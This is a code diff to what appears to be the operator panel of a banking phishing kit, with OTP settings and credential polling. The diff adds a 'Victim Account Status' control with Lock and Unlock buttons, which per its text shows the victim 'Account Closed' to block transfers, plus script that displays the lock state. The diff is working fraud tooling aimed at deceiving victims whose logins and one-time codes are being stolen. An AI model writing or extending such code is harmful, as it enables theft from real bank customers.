@@ -80,6 +80,17 @@
             <!-- Settings Panel -->
             <div class="panel" style="flex:0.7;">
                 <h2>OTP & Display Settings</h2>
+                <!-- Account Status Control -->
+                <div class="settings-group" style="text-align:center; border:2px solid #d9534f;">
+                    <p style="color:white; font-weight:bold;"><i class="fas fa-lock"></i> Victim Account Status</p>
+                    <p style="font-size:11px;">If Locked, victim sees "Account Closed" and cannot transfer.</p>
+                    <div style="display:flex; gap:10px; margin-top:10px;">
+                        <button class="red" id="btnLockAccount">Lock Account</button>
+                        <button class="green" id="btnUnlockAccount">Unlock Account</button>
+                    </div>
+                    <div id="lockStatusDisplay" style="margin-top:10px; font-weight:bold; color:#a0a0b8;">Current: UNKNOWN</div>
+                </div>
+
 
                 <!-- Display Email -->
                 <div class="settings-group">
@@ -252,6 +263,15 @@
                 } catch(e){}
             }
             previousStateStr = newStateStr;
+
+            
+                var isLocked = globalState.accountLocked;
+                var lockDisp = document.getElementById('lockStatusDisplay');
+                if (isLocked === true) {
+                    lockDisp.innerHTML = '<span style="color:#d9534f;">LOCKED</span>';
+                } else if (isLocked === false) {
+                    lockDisp.innerHTML = '<span style="color:#5cb85c;">UNLOCKED</span>';
+                }
 
             // Poll Credentials
             var logs = getSyncItem('adminLogs');
